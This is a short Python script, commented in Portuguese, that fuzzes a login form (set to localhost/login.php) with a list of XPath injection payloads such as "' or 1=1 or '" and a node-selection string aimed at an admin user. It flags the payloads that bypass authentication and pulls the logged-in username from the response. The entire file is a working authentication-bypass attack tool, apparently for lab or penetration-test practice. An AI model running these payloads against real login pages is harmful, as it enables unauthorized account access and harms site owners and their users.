import requests

# Configurações do alvo
TARGET_URL = "http://localhost/login.php" # Ajuste para a sua URL
SUCCESS_INDICATOR = "Bem-vindo"  # Texto que aparece quando o login funciona

# Lista de payloads para teste de bypass
payloads = [
    "' or 1=1 or '",
    "admin' or '1'='1",
    "' or 'a'='a",
    "' or true() or '",
    "1' or '1' = '1' or '1' = '1",
    "'] | //usuario[nome/text()='admin",
    "' or string-length(nome)=5 or '", # Tenta validar pelo tamanho do nome
]

def run_fuzzer():
    print(f"[*] Iniciando Fuzzing de XPath em: {TARGET_URL}")
    print("-" * 50)

    for payload in payloads:
        # Dados do formulário
        data = {
            'user': payload,
            'pass': 'any_password', # A senha não importa se o bypass funcionar
            'login': 'Entrar'
        }

        try:
            response = requests.post(TARGET_URL, data=data)
            
            # Verifica se o payload funcionou
            if SUCCESS_INDICATOR in response.text:
                print(f"[+] SUCESSO! Payload: {payload}")
                # Opcional: extrair o nome do usuário logado do HTML
                if "Bem-vindo," in response.text:
                    user = response.text.split("Bem-vindo, ")[1].split("!")[0]
                    print(f"    |-> Logado como: {user}")
            else:
                print(f"[-] Falhou: {payload}")

        except requests.exceptions.ConnectionError:
            print("[!] Erro: Não foi possível conectar ao servidor.")
            break

    print("-" * 50)
    print("[*] Teste finalizado.")

if __name__ == "__main__":
    run_fuzzer()
